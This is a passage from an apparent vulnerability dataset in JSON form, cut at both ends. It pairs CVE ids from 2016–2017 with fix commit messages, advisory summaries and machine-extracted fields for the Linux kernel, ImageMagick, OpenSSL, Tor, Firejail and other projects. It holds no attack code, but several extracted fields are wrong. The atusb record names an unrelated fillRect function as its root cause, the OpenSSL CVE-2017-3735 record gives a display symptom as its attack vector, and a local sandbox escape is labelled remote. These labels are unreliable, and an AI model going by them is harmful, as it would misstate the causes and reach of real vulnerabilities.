J. Wylie\" <alan@wylie.me.uk>\nTested-by: \"Alan J. Wylie\" <alan@wylie.me.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"Off-by-one error in the pipe_advance function in lib\/iov_iter.c in the Linux kernel before 4.9.5 allows local users to obtain sensitive information from uninitialized heap-memory locations in opportunistic circumstances by reading from a pipe after an incorrect buffer-release decision.","commit_message_1":"fix a fencepost error in pipe_advance ( ) the logic in pipe_advance ( ) used to release all buffer past the new position failed in case when the number of buffer to release wa equal to pipe- > buffer","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading from a pipe after an incorrect buffer - release decision","Impact":"obtain sensitive information from uninitialized heap - memory locations in opportunistic circumstances","Root Cause":"caused by an off-by-one error","Attack Type":"local attacker"},{"commit_id":"146cc8a17a3b4996f6805ee5c080e7101277c410","cve_id":"CVE-2017-5549","cwe_id":"CWE-532","commit_message":"USB: serial: kl5kusb105: fix line-state error handling\n\nThe current implementation failed to detect short transfers when\nattempting to read the line state, and also, to make things worse,\nlogged the content of the uninitialised heap transfer buffer.\n\nFixes: abf492e7b3ae (\"USB: kl5kusb105: fix DMA buffers on stack\")\nFixes: 1da177e4c3f4 (\"Linux-2.6.12-rc2\")\nCc: stable <stable@vger.kernel.org>\nReviewed-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nSigned-off-by: Johan Hovold <johan@kernel.org>","summary":"The klsi_105_get_line_state function in drivers\/usb\/serial\/kl5kusb105.c in the Linux kernel before 4.9.5 places uninitialized heap-memory contents into a log entry upon a failure to read the line status, which allows local users to obtain sensitive information by reading the log.","commit_message_1":"serial : kl5kusb105 : fix line-state error handling the current implementation failed to detect short transfer when attempting to read the line state , and also , to make thing worse , logged the content of the uninitialised heap transfer buffer","Vulnerability Type":"Insertion of Sensitive Information into Log File","Attack Vector":"by reading the log .","Impact":"obtain sensitive information","Root Cause":"places uninitialized heap-memory contents into a log entry upon a failure to read the line status","Attack Type":"local attacker"},{"commit_id":"05a974efa4bdf6e2a150e3f27dc6fcf0a9ad5655","cve_id":"CVE-2017-5548","cwe_id":"CWE-119","commit_message":"ieee802154: atusb: do not use the stack for buffers to make them DMA able\n\nFrom 4.9 we should really avoid using the stack here as this will not be DMA\nable on various platforms. This changes the buffers already being present in\ntime of 4.9 being released. This should go into stable as well.\n\nReported-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Stefan Schmidt <stefan@osg.samsung.com>\nSigned-off-by: Marcel Holtmann <marcel@holtmann.org>","summary":"drivers\/net\/ieee802154\/atusb.c in the Linux kernel 4.9.x before 4.9.6 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"atusb : do not use the stack for buffer to make them dma able from <file> we should really avoid using the stack here a this will not be dma able on various platform","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the ModifiablePixelBuffer::fillRect function","Attack Type":"local attacker"},{"commit_id":"6d104af38b570d37aa32a5803b04c354f8ed513d","cve_id":"CVE-2017-5547","cwe_id":"CWE-119","commit_message":"HID: corsair: fix DMA buffers on stack\n\nNot all platforms support DMA to the stack, and specifically since v4.9\nthis is no longer supported on x86 with VMAP_STACK either.\n\nNote that the macro-mode buffer was larger than necessary.\n\nFixes: 6f78193ee9ea (\"HID: corsair: Add Corsair Vengeance K90 driver\")\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Johan Hovold <johan@kernel.org>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"drivers\/hid\/hid-corsair.c in the Linux kernel 4.9.x before 4.9.6 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"corsair : fix dma buffer on stack not all platform support dma to the stack , and specifically since <file> this is no longer supported on x86 with vmap_stack either","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by drivers\/hid\/hid-corsair.c incorrectly interacting with the CONFIG_VMAP_STACK option","Attack Type":"local attacker"},{"commit_id":"c4e490cf148e85ead0d1b1c2caaba833f1d5b29f","cve_id":"CVE-2017-5546","cwe_id":null,"commit_message":"mm\/slab.c: fix SLAB freelist randomization duplicate entries\n\nThis patch fixes a bug in the freelist randomization code.  When a high\nrandom number is used, the freelist will contain duplicate entries.  It\nwill result in different allocations sharing the same chunk.\n\nIt will result in odd behaviours and crashes.  It should be uncommon but\nit depends on the machines.  We saw it happening more often on some\nmachines (every few hours of running tests).\n\nFixes: c7ce4f60ac19 (\"mm: SLAB freelist randomization\")\nLink: http:\/\/lkml.kernel.org\/r\/20170103181908.143178-1-thgarnie@google.com\nSigned-off-by: John Sperbeck <jsperbeck@google.com>\nSigned-off-by: Thomas Garnier <thgarnie@google.com>\nCc: Christoph Lameter <cl@linux.com>\nCc: Pekka Enberg <penberg@kernel.org>\nCc: David Rientjes <rientjes@google.com>\nCc: Joonsoo Kim <iamjoonsoo.kim@lge.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The freelist-randomization feature in mm\/slab.c in the Linux kernel 4.8.x and 4.9.x before 4.9.5 allows local users to cause a denial of service (duplicate freelist entries and system crash) or possibly have unspecified other impact in opportunistic circumstances by leveraging the selection of a large value for a random number.","commit_message_1":"fix slab freelist randomization duplicate entry this patch fix a bug in the freelist randomization code","Vulnerability Type":"duplicate freelist entries","Attack Vector":"by leveraging the selection of a large value for a random number","Impact":"cause a denial of service ( duplicate freelist entries and system crash ) or possibly have unspecified other impact in opportunistic circumstances","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"7391a506352c009fe044dead7baad9e22dd279ee","cve_id":"CVE-2017-5545","cwe_id":"CWE-125","commit_message":"plistutil: Prevent OOB heap buffer read by checking input size\n\nAs pointed out in #87 plistutil would do a memcmp with a heap buffer\nwithout checking the size. If the size is less than 8 it would read\nbeyond the bounds of this heap buffer. This commit prevents that.","summary":"The main function in plistutil.c in libimobiledevice libplist through 1.12 allows attackers to obtain sensitive information from process memory or cause a denial of service (buffer over-read) via Apple Property List data that is too short.","commit_message_1":"prevent oob heap buffer read by checking input size a pointed out in # <number> plistutil would do a memcmp with a heap buffer without checking the size","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via apple property list data that is too short","Impact":"obtain sensitive information from process memory or cause a denial of service ( buffer over - read )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"e52a436c0e1c5e9f7ef13428dba83194a800f4df","cve_id":"CVE-2017-5522","cwe_id":"CWE-119","commit_message":"security fix (patch by EvenR)","summary":"Stack-based buffer overflow in MapServer before 6.0.6, 6.2.x before 6.2.4, 6.4.x before 6.4.5, and 7.0.x before 7.0.4 allows remote attackers to cause a denial of service (crash) or execute arbitrary code via vectors involving WFS get feature requests.","commit_message_1":"security fix ( patch by evenr )","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors involving wfs get feature requests","Impact":"cause a denial of service ( crash ) or execute arbitrary code","Root Cause":"caused by a stack-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"c8c6a0f123d5e35c173125365c97e2c0fc7eca42","cve_id":"CVE-2017-5511","cwe_id":"CWE-119","commit_message":"Fix improper cast that could cause an overflow as demonstrated in #347.","summary":"coders\/psd.c in ImageMagick allows remote attackers to have unspecified impact by leveraging an improper cast, which triggers a heap-based buffer overflow.","commit_message_1":"fix improper cast that could cause an overflow a demonstrated in # <number>","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging an improper cast , which triggers a heap - based buffer overflow","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking by psd.c","Attack Type":"remote attacker"},{"commit_id":"91cc3f36f2ccbd485a0456bab9aebe63b635da88","cve_id":"CVE-2017-5510","cwe_id":"CWE-787","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/348","summary":"coders\/psd.c in ImageMagick allows remote attackers to have unspecified impact via a crafted PSD file, which triggers an out-of-bounds write.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted psd file","Impact":"have unspecified impact","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"d4ec73f866a7c42a2e7f301fcd696e5cb7a7d3ab","cve_id":"CVE-2017-5509","cwe_id":"CWE-787","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/350","summary":"coders\/psd.c in ImageMagick allows remote attackers to have unspecified impact via a crafted PSD file, which triggers an out-of-bounds write.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted psd file","Impact":"have unspecified impact","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"c073a7712d82476b5fbee74856c46b88af9c3175","cve_id":"CVE-2017-5508","cwe_id":"CWE-119","commit_message":"https:\/\/www.imagemagick.org\/discourse-server\/viewtopic.php?f=3&t=31161","summary":"Heap-based buffer overflow in the PushQuantumPixel function in ImageMagick before 6.9.7-3 and 7.x before 7.0.4-3 allows remote attackers to cause a denial of service (application crash) via a crafted TIFF file.","commit_message_1":"http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted tiff file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by improper bounds checking by PushQuantumPixel","Attack Type":"remote attacker"},{"commit_id":"6235f1f7a9f7b0f83b197f6cd0073dbb6602d0fb","cve_id":"CVE-2017-5506","cwe_id":"CWE-415","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/354","summary":"Double free vulnerability in magick\/profile.c in ImageMagick allows remote attackers to have unspecified impact via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"double free","Attack Vector":"via a crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory corruption","Attack Type":"remote attacker"},{"commit_id":"4cc0286f2f3780abc6084bcdae5dce595daa3c12","cve_id":"CVE-2017-5340","cwe_id":"CWE-190","commit_message":"Fix #73832 - leave the table in a safe state if the size is too big.","summary":"Zend\/zend_hash.c in PHP before 7.0.15 and 7.1.x before 7.1.1 mishandles certain cases that require large array allocations, which allows remote attackers to execute arbitrary code or cause a denial of service (integer overflow, uninitialized memory access, and use of arbitrary destructor function pointers) via crafted serialized data.","commit_message_1":"fix # <number> - leave the table in a safe state if the size is too big","Vulnerability Type":"integer overflow","Attack Vector":"via crafted serialized data","Impact":"execute arbitrary code or cause a denial of service ( integer overflow , uninitialized memory access , and use of arbitrary destructor function pointers )","Root Cause":"caused by improper handling of large array allocations","Attack Type":"remote attacker"},{"commit_id":"d7fc532c42f0e9bf427923bab85433282b3e5117","cve_id":"CVE-2017-5226","cwe_id":"CWE-20","commit_message":"Call setsid() before executing sandboxed code (CVE-2017-5226)\n\nThis prevents the sandboxed code from getting a controlling tty,\nwhich in turn prevents it from accessing the TIOCSTI ioctl and hence\nfaking terminal input.\n\nFixes: #142\n\nCloses: #143\nApproved by: cgwalters","summary":"When executing a program via the bubblewrap sandbox, the nonpriv session can escape to the parent session by using the TIOCSTI ioctl to push characters into the terminal's input buffer, allowing an attacker to escape the sandbox.","commit_message_1":"call setsid ( ) before executing sandboxed code ( <cve_id> ) this prevents the sandboxed code from getting a controlling tty , which in turn prevents it from accessing the tiocsti ioctl and hence faking terminal input","Vulnerability Type":"Improper Input Validation","Attack Vector":"By using the TIOCSTI ioctl to push characters into the terminal's input buffer","Impact":"escape the sandbox","Root Cause":"caused by an error related to the nonpriv session escaping to the parent session","Attack Type":"remote attacker"},{"commit_id":"5c080298d59efa53264d7248bbe3a04660db6ef7","cve_id":"CVE-2017-5225","cwe_id":"CWE-119","commit_message":"* tools\/tiffcp.c: error out cleanly in cpContig2SeparateByRow and\ncpSeparate2ContigByRow if BitsPerSample != 8 to avoid heap based overflow.\nFixes http:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2656 and\nhttp:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2657","summary":"LibTIFF version 4.0.7 is vulnerable to a heap buffer overflow in the tools\/tiffcp resulting in DoS or code execution via a crafted BitsPerSample value.","commit_message_1":"error out cleanly in cpcontig2separatebyrow and cpseparate2contigbyrow if bitspersample ! = <number> to avoid heap based overflow","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted BitsPerSample value","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the tools\/tiffcp function","Attack Type":"remote attacker"},{"commit_id":"3a55ddd3c4c11ce75a86afbefd085d8d397ff957","cve_id":"CVE-2017-5209","cwe_id":"CWE-125","commit_message":"base64: Rework base64decode to handle split encoded data correctly","summary":"The base64decode function in base64.c in libimobiledevice libplist through 1.12 allows attackers to obtain sensitive information from process memory or cause a denial of service (buffer over-read) via split encoded Apple Property List data.","commit_message_1":"base64 : rework base64decode to handle split encoded data correctly","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via split encoded apple property list data","Impact":"obtain sensitive information from process memory or cause a denial of service ( buffer over - read )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"5d43fdcd215203868d440ffc42036f5f5ffc89fc","cve_id":"CVE-2017-5207","cwe_id":"CWE-269","commit_message":"security fix","summary":"Firejail before 0.9.44.4, when running a bandwidth command, allows local users to gain root privileges via the --shell argument.","commit_message_1":"security fix","Vulnerability Type":"Improper Privilege Management","Attack Vector":"By using specially-crafted shell commands","Impact":"gain elevated privileges","Root Cause":"By using specially-crafted shell commands","Attack Type":"local attacker"},{"commit_id":"6b8dba29d73257311564ee7f27b9b14758cc693e","cve_id":"CVE-2017-5206","cwe_id":null,"commit_message":"security fix","summary":"Firejail before 0.9.44.4, when running on a Linux kernel before 4.8, allows context-dependent attackers to bypass a seccomp-based sandbox protection mechanism via the --allow-debuggers argument.","commit_message_1":"security fix","Vulnerability Type":"unspecified","Attack Vector":"via the - - allow - debuggers argument","Impact":"bypass a seccomp - based sandbox protection mechanism","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"068b963bb7afc57f5bdd723de0dd15e7795d5822","cve_id":"CVE-2017-3735","cwe_id":"CWE-119","commit_message":"Avoid out-of-bounds read\n\nFixes CVE 2017-3735\n\nReviewed-by: Kurt Roeckx <kurt@roeckx.be>\n(Merged from https:\/\/github.com\/openssl\/openssl\/pull\/4276)\n\n(cherry picked from commit b23171744b01e473ebbfd6edad70c1c3825ffbcd)","summary":"While parsing an IPAddressFamily extension in an X.509 certificate, it is possible to do a one-byte overread. This would result in an incorrect text display of the certificate. This bug has been present since 2006 and is present in all versions of OpenSSL before 1.0.2m and 1.1.0g.","commit_message_1":"avoid out-of-bounds read","Vulnerability Type":"buffer overflow","Attack Vector":"an incorrect text display of the certificate","Impact":"obtain sensitive information","Root Cause":"caused by an error while parsing an IPAdressFamily extension","Attack Type":"remote attacker"},{"commit_id":"4ad93618d26a3ea23d36ad5498ff4f59eff3a4d2","cve_id":"CVE-2017-3733","cwe_id":"CWE-20","commit_message":"Don't change the state of the ETM flags until CCS processing\n\nChanging the ciphersuite during a renegotiation can result in a crash\nleading to a DoS attack. ETM has not been implemented in 1.1.0 for DTLS\nso this is TLS only.\n\nThe problem is caused by changing the flag indicating whether to use ETM\nor not immediately on negotiation of ETM, rather than at CCS. Therefore,\nduring a renegotiation, if the ETM state is changing (usually due to a\nchange of ciphersuite), then an error\/crash will occur.\n\nDue to the fact that there are separate CCS messages for read and write\nwe actually now need two flags to determine whether to use ETM or not.\n\nCVE-2017-3733\n\nReviewed-by: Richard Levitte <levitte@openssl.org>","summary":"During a renegotiation handshake if the Encrypt-Then-Mac extension is negotiated where it was not in the original handshake (or vice-versa) then this can cause OpenSSL 1.1.0 before 1.1.0e to crash (dependent on ciphersuite). Both clients and servers are affected.","commit_message_1":"do n't change the state of the etm flag until cc processing changing the ciphersuite during a renegotiation can result in a crash leading to a do attack","Vulnerability Type":"Improper Input Validation","Attack Vector":"if the Encrypt-Then-Mac extension is negotiated where it was not in the original handshake","Impact":"cause a denial of service","Root Cause":"is negotiated where it was not","Attack Type":"remote attacker"},{"commit_id":"00d965474b22b54e4275232bc71ee0c699c5cd21","cve_id":"CVE-2017-3731","cwe_id":"CWE-125","commit_message":"crypto\/evp: harden AEAD ciphers.\n\nOriginally a crash in 32-bit build was reported CHACHA20-POLY1305\ncipher. The crash is triggered by truncated packet and is result\nof excessive hashing to the edge of accessible memory. Since hash\noperation is read-only it is not considered to be exploitable\nbeyond a DoS condition. Other ciphers were hardened.\n\nThanks to Robert \u015awi\u0119cki for report.\n\nCVE-2017-3731\n\nReviewed-by: Rich Salz <rsalz@openssl.org>","summary":"If an SSL\/TLS server or client is running on a 32-bit host, and a specific cipher is being used, then a truncated packet can cause that server or client to perform an out-of-bounds read, usually resulting in a crash. For OpenSSL 1.1.0, the crash can be triggered when using CHACHA20\/POLY1305; users should upgrade to 1.1.0d. For Openssl 1.0.2, the crash can be triggered when using RC4-MD5; users who have not disabled that algorithm should update to 1.0.2k.","commit_message_1":"harden aead cipher","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially crafted truncated packets","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds read when using a specific cipher","Attack Type":"remote attacker"},{"commit_id":"efbe126e3ebb9123ac9d058aa2bb044261342aaa","cve_id":"CVE-2017-3730","cwe_id":"CWE-476","commit_message":"Fix missing NULL checks in CKE processing\n\nReviewed-by: Rich Salz <rsalz@openssl.org>","summary":"In OpenSSL 1.1.0 before 1.1.0d, if a malicious server supplies bad parameters for a DHE or ECDHE key exchange then this can result in the client attempting to dereference a NULL pointer leading to a client crash. This could be exploited in a Denial of Service attack.","commit_message_1":"fix missing null check in cke processing","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By sending specially crafted parameters for a DHE or ECDHE key exchange","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"a70934eea95c76a7737b83773bffe8738935082d","cve_id":"CVE-2017-2920","cwe_id":"CWE-119","commit_message":"Fix a buffer overflow.\n\nThis is only the minimum workaround to prevent buffer overflow:\nStop iterating once the (fixed!) size of the output buffers is\nreached. In response to\nhttps:\/\/www.talosintelligence.com\/vulnerability_reports\/TALOS-2017-0317\n\nHowever, this code is a huge mess anyway and is in no way\nanything like up-to-date C++ code. Please, anyone, replace it\nwith something more modern. Thanks.","summary":"An memory corruption vulnerability exists in the .SVG parsing functionality of Computerinsel Photoline 20.02. A specially crafted .SVG file can cause a vulnerability resulting in memory corruption, which can potentially lead to arbitrary code execution. An attacker can send a specific .SVG file to trigger this vulnerability.","commit_message_1":"fix a buffer overflow","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted SVG file","Impact":"execute arbitrary code","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"43a6684519ab0a6c52024b5e25322476cabad893","cve_id":"CVE-2017-2671","cwe_id":null,"commit_message":"ping: implement proper locking\n\nWe got a report of yet another bug in ping\n\nhttp:\/\/www.openwall.com\/lists\/oss-security\/2017\/03\/24\/6\n\n->disconnect() is not called with socket lock held.\n\nFix this by acquiring ping rwlock earlier.\n\nThanks to Daniel, Alexander and Andrey for letting us know this problem.\n\nFixes: c319b4d76b9e (\"net: ipv4: add IPPROTO_ICMP socket kind\")\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Daniel Jiang <danieljiang0415@gmail.com>\nReported-by: Solar Designer <solar@openwall.com>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ping_unhash function in net\/ipv4\/ping.c in the Linux kernel through 4.10.8 is too late in obtaining a certain lock and consequently cannot ensure that disconnect function calls are safe, which allows local users to cause a denial of service (panic) by leveraging access to the protocol value of IPPROTO_ICMP in a socket system call.","commit_message_1":"implement proper locking we got a report of yet another bug in ping http : \/\/<file>","Vulnerability Type":"panic","Attack Vector":"by leveraging access to the protocol value of ipproto _ icmp in a socket system call","Impact":"cause a denial of service ( panic )","Root Cause":"obtain a certain lock and consequently cannot ensure that disconnect function calls are safe","Attack Type":"local attacker"},{"commit_id":"c06cfb08b88dfbe13be44a69ae2fdc3a7c902d81","cve_id":"CVE-2017-2647","cwe_id":"CWE-476","commit_message":"KEYS: Remove key_type::match in favour of overriding default by match_preparse\n\nA previous patch added a ->match_preparse() method to the key type.  This is\nallowed to override the function called by the iteration algorithm.\nTherefore, we can just set a default that simply checks for an exact match of\nthe key description with the original criterion data and allow match_preparse\nto override it as needed.\n\nThe key_type::match op is then redundant and can be removed, as can the\nuser_match() function.\n\nSigned-off-by: David Howells <dhowells@redhat.com>\nAcked-by: Vivek Goyal <vgoyal@redhat.com>","summary":"The KEYS subsystem in the Linux kernel before 3.18 allows local users to gain privileges or cause a denial of service (NULL pointer dereference and system crash) via vectors involving a NULL value for a certain match field, related to the keyring_search_iterator function in keyring.c.","commit_message_1":"remove key_type : :match in favour of overriding default by match_preparse a previous patch added a - > match_preparse ( ) method to the key type","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via vectors involving a value for a certain match field , related to the keyring _ search _ iterator function in keyring . c","Impact":"gain privileges or cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"129a72a0d3c8e139a04512325384fe5ac119e74d","cve_id":"CVE-2017-2584","cwe_id":"CWE-416","commit_message":"KVM: x86: Introduce segmented_write_std\n\nIntroduces segemented_write_std.\n\nSwitches from emulated reads\/writes to standard read\/writes in fxsave,\nfxrstor, sgdt, and sidt.  This fixes CVE-2017-2584, a longstanding\nkernel memory leak.\n\nSince commit 283c95d0e389 (\"KVM: x86: emulate FXSAVE and FXRSTOR\",\n2016-11-09), which is luckily not yet in any final release, this would\nalso be an exploitable kernel memory *write*!\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nCc: stable@vger.kernel.org\nFixes: 96051572c819194c37a8367624b285be10297eca\nFixes: 283c95d0e3891b64087706b344a4b545d04a6e62\nSuggested-by: Paolo Bonzini <pbonzini@redhat.com>\nSigned-off-by: Steve Rutherford <srutherford@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"arch\/x86\/kvm\/emulate.c in the Linux kernel through 4.9.3 allows local users to obtain sensitive information from kernel memory or cause a denial of service (use-after-free) via a crafted application that leverages instruction emulation for fxrstor, fxsave, sgdt, and sidt.","commit_message_1":"x86 : introduce segmented_write_std introduces segemented_write_std","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted application that leverages instruction emulation for fxrstor , fxsave , sgdt , and sidt","Impact":"obtain sensitive information from kernel memory or cause a denial of service ( use - after - free )","Root Cause":"caused by an use-after-free error","Attack Type":"local attacker"},{"commit_id":"33ab91103b3415e12457e3104f0e4517ce12d0f3","cve_id":"CVE-2017-2583","cwe_id":null,"commit_message":"KVM: x86: fix emulation of \"MOV SS, null selector\"\n\nThis is CVE-2017-2583.  On Intel this causes a failed vmentry because\nSS's type is neither 3 nor 7 (even though the manual says this check is\nonly done for usable SS, and the dmesg splat says that SS is unusable!).\nOn AMD it's worse: svm.c is confused and sets CPL to 0 in the vmcb.\n\nThe fix fabricates a data segment descriptor when SS is set to a null\nselector, so that CPL and SS.DPL are set correctly in the VMCS\/vmcb.\nFurthermore, only allow setting SS to a NULL selector if SS.RPL < 3;\nthis in turn ensures CPL < 3 because RPL must be equal to CPL.\n\nThanks to Andy Lutomirski and Willy Tarreau for help in analyzing\nthe bug and deciphering the manuals.\n\nReported-by: Xiaohan Zhang <zhangxiaohan1@huawei.com>\nFixes: 79d5b4c3cd809c770d4bf9812635647016c56011\nCc: stable@nongnu.org\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The load_segment_descriptor implementation in arch\/x86\/kvm\/emulate.c in the Linux kernel before 4.9.5 improperly emulates a *MOV SS, NULL selector* instruction, which allows guest OS users to cause a denial of service (guest OS crash) or gain guest OS privileges via a crafted application.","commit_message_1":"x86 : fix emulation of `` mov s , null selector '' this is <cve_id>","Vulnerability Type":"guest OS crash","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( guest os crash ) or gain guest os privileges","Root Cause":"caused by an incorrect segment selector(SS) value error when loading values into the SS register","Attack Type":"remote attacker"},{"commit_id":"09ea89764a4d3a907808ed7d4fe42abfe64bd486","cve_id":"CVE-2017-0380","cwe_id":"CWE-532","commit_message":"Fix log-uninitialized-stack bug in rend_service_intro_established.\n\nFixes bug 23490; bugfix on 0.2.7.2-alpha.\n\nTROVE-2017-008\nCVE-2017-0380","summary":"The rend_service_intro_established function in or\/rendservice.c in Tor before 0.2.8.15, 0.2.9.x before 0.2.9.12, 0.3.0.x before 0.3.0.11, 0.3.1.x before 0.3.1.7, and 0.3.2.x before 0.3.2.1-alpha, when SafeLogging is disabled, allows attackers to obtain sensitive information by leveraging access to the log files of a hidden service, because uninitialized stack data is included in an error message about construction of an introduction point circuit.","commit_message_1":"fix log-uninitialized-stack bug in rend_service_intro_established","Vulnerability Type":"Insertion of Sensitive Information into Log File","Attack Vector":"By leveraging access to the log files of a hidden service","Impact":"obtain sensitive information by leveraging","Root Cause":"safelogging is disabled","Attack Type":"remote attacker"},{"commit_id":"665baf5ed5c6186d973c46cdea165c0548027350","cve_id":"CVE-2017-0377","cwe_id":"CWE-200","commit_message":"Consider the exit family when applying guard restrictions.\n\nWhen the new path selection logic went into place, I accidentally\ndropped the code that considered the _family_ of the exit node when\ndeciding if the guard was usable, and we didn't catch that during\ncode review.\n\nThis patch makes the guard_restriction_t code consider the exit\nfamily as well, and adds some (hopefully redundant) checks for the\ncase where we lack a node_t for a guard but we have a bridge_info_t\nfor it.\n\nFixes bug 22753; bugfix on 0.3.0.1-alpha. Tracked as TROVE-2016-006\nand CVE-2017-0377.","summary":"Tor 0.3.x before 0.3.0.9 has a guard-selection algorithm that only considers the exit relay (not the exit relay's family), which might allow remote attackers to defeat intended anonymity properties by leveraging the existence of large families.","commit_message_1":"consider the exit family when applying guard restriction","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by leveraging the existence of large families","Impact":"defeat intended anonymity properties","Root Cause":"has a guard - selection algorithm that only considers the exit relay ( not the exit relay ' s family ) ","Attack Type":"remote attacker"},{"commit_id":"56a7c5bc15e0447203a491c1ee37de9939ad1dcd","cve_id":"CVE-2017-0376","cwe_id":"CWE-617","commit_message":"TROVE-2017-005: Fix assertion failure in connection_edge_process_relay_cell\n\nOn an hidden service rendezvous circuit, a BEGIN_DIR could be sent\n(maliciously) which would trigger a tor_assert() because\nconnection_edge_process_relay_cell() thought that the circuit is an\nor_circuit_t but is an origin circuit in reality.\n\nFixes #22494\n\nReported-by: Roger Dingledine <arma@torproject.org>\nSigned-off-by: David Goulet <dgoulet@torproject.org>","summary":"The hidden-service feature in Tor before 0.3.0.8 allows a denial of service (assertion failure and daemon exit) in the connection_edge_process_relay_cell function via a BEGIN_DIR cell on a rendezvous circuit.","commit_message_1":"fix assertion failure in connection_edge_process_relay_cell on an hidden service rendezvous circuit , a begin_dir could be sent ( maliciously ) which would trigger a tor_assert ( ) because connection_edge_process_relay_cell ( ) thought that the circuit is an or_circuit_t but is an origin circuit in reality","Vulnerability Type":"Reachable Assertion","Attack Vector":"via a begin _ dir cell on a rendezvous circuit","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"attacker"},{"commit_id":"79b59a2dfcb68897ee89d98587d09e55f07e68d7","cve_id":"CVE-2017-0375","cwe_id":"CWE-617","commit_message":"TROVE-2017-004: Fix assertion failure in relay_send_end_cell_from_edge_\n\nThis fixes an assertion failure in relay_send_end_cell_from_edge_() when an\norigin circuit and a cpath_layer = NULL were passed.\n\nA service rendezvous circuit could do such a thing when a malformed BEGIN cell\nis received but shouldn't in the first place because the service needs to send\nan END cell on the circuit for which it can not do without a cpath_layer.\n\nFixes #22493\n\nReported-by: Roger Dingledine <arma@torproject.org>\nSigned-off-by: David Goulet <dgoulet@torproject.org>","summary":"The hidden-service feature in Tor before 0.3.0.8 allows a denial of service (assertion failure and daemon exit) in the relay_send_end_cell_from_edge_ function via a malformed BEGIN cell.","commit_message_1":"fix assertion failure in relay_send_end_cell_from_edge_ this fix an assertion failure in relay_send_end_cell_from_edge_ ( ) when an origin circuit and a cpath_layer = null were passed","Vulnerability Type":"Reachable Assertion","Attack Vector":"via a malformed begin cell","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"attacker"},{"commit_id":"874804da0c014a7d704b3d285aa500098a931f50","cve_id":"CVE-2016-10517","cwe_id":"CWE-254","commit_message":"Security: Cross Protocol Scripting protection.\n\nThis is an attempt at mitigating problems due to cross protocol\nscripting, an attack targeting services using line oriented protocols\nlike Redis that can accept HTTP requests as valid protocol, by\ndiscarding the invalid parts and accepting the payloads sent, for\nexample, via a POST request.\n\nFor this to be effective, when we detect POST and Host: and terminate\nthe connection asynchronously, the networking code was modified in order\nto never process further input. It was later verified that in a\npipelined request containing a POST command, the 